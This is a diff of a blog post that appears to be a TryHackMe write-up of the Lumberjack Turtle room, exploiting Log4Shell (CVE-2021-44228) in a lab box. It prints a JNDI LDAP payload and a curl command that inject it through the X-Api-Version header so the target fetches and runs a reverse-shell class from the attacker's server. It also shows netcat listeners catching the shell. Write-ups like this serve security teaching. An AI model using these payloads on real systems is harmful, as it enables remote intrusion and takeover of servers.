@@ -1,16 +1,16 @@
 ---
 layout: post
 title: "THM - Lumberjack Turtle"
-date: 2022-01-30  
+date: 2022-01-31  
 categories: [Tryhackme, Linux]
-tags: [log4shell, log4j, docker, CVE-2021-44228]
+tags: [log4shell, log4j, docker escape, CVE-2021-44228]
 image: ../../assets/img/posts/Lumberjackturtle/lumberjackturle.png 
 ---
 
 # Summary
 --------------
 
-**Lumberjack Turtle** is a medium difficulty box from Tryhackme which is entirely focused on **Log4j/Log4shell**. The website is vulnerable to Log4j & so we're able to exploit it and get a shell on the box . We find a **.dockerenv** file in the / directory which indicates we are on a docker container.To obtain the root flag , we mount the **/dev/xvda1** disk partition since it contains the entire filesystem(/) to access all the files .
+**Lumberjack Turtle** is a medium difficulty box from Tryhackme which is entirely focused on **Log4j/Log4shell** a 0-day vulnerability that caused a havoc on the internet . The website is vulnerable to Log4j & so we're able to exploit it and get a shell on the box . We find a **.dockerenv** file in the / directory which indicates we are on a docker container. To obtain the root flag , we mount the **/dev/xvda1** disk partition since it contains the entire filesystem(/) to access all the files .
 
 |  **Room name** 	| Lumberjack Turtle                                           	|
 |:--------------:	|----------------------------------------------------	|
@@ -20,12 +20,13 @@ image: ../../assets/img/posts/Lumberjackturtle/lumberjackturle.png
 |   **Creator**  	| [SilverStr](https://tryhackme.com/p/SilverStr) 	|
 
 # Enumeration 
+----------------------
 
 ## Portscan 
 
 ```bash
-┌─[shebu@VM]─[~/thm/Lumberjackturtle]
-└──╼ $nmap -sCV lumberjackturtle.thm -oN lumberjack.thm
+┌──(root💀kali)-[~/thm/Lumberjackturtle]
+└─$ nmap -sCV lumberjackturtle.thm -oN lumberjack.thm
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 04:56 EST
 Nmap scan report for lumberjackturtle.thm (10.10.241.157)
 Host is up (0.32s latency).
@@ -44,7 +45,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 38.92 seconds
 ```
 
-# Website - port 80
+## Website - port 80
 
 The homepage of the website has only this comment .It gives us a hint as `java` and also to bruteforce the directories.
 
@@ -52,11 +53,11 @@ The homepage of the website has only this comment .It gives us a hint as `java` 
 
 ## Directory bruteforcing
 
-### /~logs
+## /~logs
 
-```
-┌─[shebu@VM]─[~/thm/Lumberjackturtle]
-└──╼ $dirsearch -u http://lumberjackturtle.thm -w /usr/share/wordlists/dirb/common.txt 
+```bash
+┌──(root💀kali)-[~/thm/Lumberjackturtle]
+└─$ dirsearch -u http://lumberjackturtle.thm -w /usr/share/wordlists/dirb/common.txt 
 
   _|. _ _  _  _  _ _|_    v0.4.1
  (_||| _) (/_(_|| (_| )
@@ -79,15 +80,14 @@ Task Completed
 Now lets visit `/~logs` directory .
 
 ![website2](../../assets/img/posts/Lumberjackturtle/website2.png)
-_/~logs_
 
 Again it tells us to go deeper !
 
-### /log4j
+## /log4j
 
-```
-┌─[shebu@VM]─[~/thm/Lumberjackturtle/log4j-finder]
-└──╼ $dirsearch -u http://lumberjackturtle.thm/~logs/ -w /usr/share/wordlists/dirb/common.txt 
+```bash
+┌──(root💀kali)-[~/thm/Lumberjackturtle]
+└─$ dirsearch -u http://lumberjackturtle.thm/~logs/ -w /usr/share/wordlists/dirb/common.txt 
 
   _|. _ _  _  _  _ _|_    v0.4.1
  (_||| _) (/_(_|| (_| )
@@ -108,28 +108,27 @@ Task Completed
 Seems like a dead end. The comment here tells us that its vulnerabele
 
 # Shell as Docker root
+-----------------------
 
 ## Testing for log4j
 
-Intercept the request in burp and sent it to repeater tab. Set up a netcat listener on your terminal to check for any incoming connections .
-
-### User-Agent header
+Intercept the request in burp and send it to repeater tab. Set up a netcat listener on your terminal to look for any incoming connections . 
 
 First lets test for log4j on `User-Agent` header.
 
-![website3](../../assets/img/posts/Lumberjackturtle/website3.png)
+![burp1](../../assets/img/posts/Lumberjackturtle/burp1.png)
 
 We get a hint in response - `CVE-2021-44228 IN X-Api-Version` .
 
 Testing it again but this time sending out payload in **X-Api-version** header.
 
-![website4](../../assets/img/posts/Lumberjackturtle/website4.png)
+![burp2](../../assets/img/posts/Lumberjackturtle/burp2.png)
 
 We dont get any response back which is a good sign .It means we've got a connection back in our netcat session.
 
-```
-┌─[✗]─[shebu@VM]─[~/thm/Lumberjackturtle]
-└──╼ $sudo nc -lvnp 53
+```bash
+┌──(root💀kali)-[~/thm/Lumberjackturtle]
+└─$ sudo nc -lvnp 53
 listening on [any] 53 ...
 connect to [10.8.106.23] from (UNKNOWN) [10.10.197.211] 50810
 0
@@ -139,17 +138,17 @@ connect to [10.8.106.23] from (UNKNOWN) [10.10.197.211] 50810
 
 Now we need to get a shell to move further.
 
-### Exploit-chain 
+### Exploit 
 
-This is how it works 
+ _This is how it works_ 
 
 1. When we send the payload `${jndi:ldap://attackerserver:1389/Exploit}` - it reaches out to our LDAP server .
 2. The LDAP server forwards the request to our secondary server asking for the resource located at `http://attackerserver:8000/Exploit` .
 3. Secondary server serves the `Exploit.class` file.
-4. After retreiving , `the victim_server executes the code present in Exploit.class` (which is a reverse shell)
+4. After retreiving , `the victim_server executes the code present in Exploit.class` (which is basically a reverse shell)
 5. Once it executes , we get a reverse shell back on our netcat .
 
-I'll explain the steps one by one ,just follow me
+I'll explain the steps one by one , just follow me along .
 
 First things first we need `java version 8` on our machine in order to build the LDAP server .Create 4 terminal windows and follow the steps.
 > Note : Change VICTIM-IP with your Machine_IP and ATTACKER-IP to your tun0 IP! 
@@ -207,9 +206,9 @@ curl -X GET  http://VICTIM-IP/~logs/log4j/ -H 'X-Api-Version: ${jndi:ldap://Atta
 ```
 And we get a shell back on our nc
 
-```
-┌─[shebu@VM]─[~/thm/log4j]
-└──╼ $nc -lvnp 9999
+```bash
+┌──(root💀kali)-[~/thm/Lumberjackturtle]
+└─$ nc -lvnp 9999
 listening on [any] 9999 ...
 connect to [10.8.106.23] from (UNKNOWN) [10.10.244.37] 42387
 whoami
@@ -236,7 +235,8 @@ drwxr-xr-x    1 root     root          4096 Dec 13 01:26 ..
 /opt # cat .flag1
 THM{LOG*****W}
 ```
-# root.txt 🚩
+# root.txt
+---------------
 
 ## docker escape
 
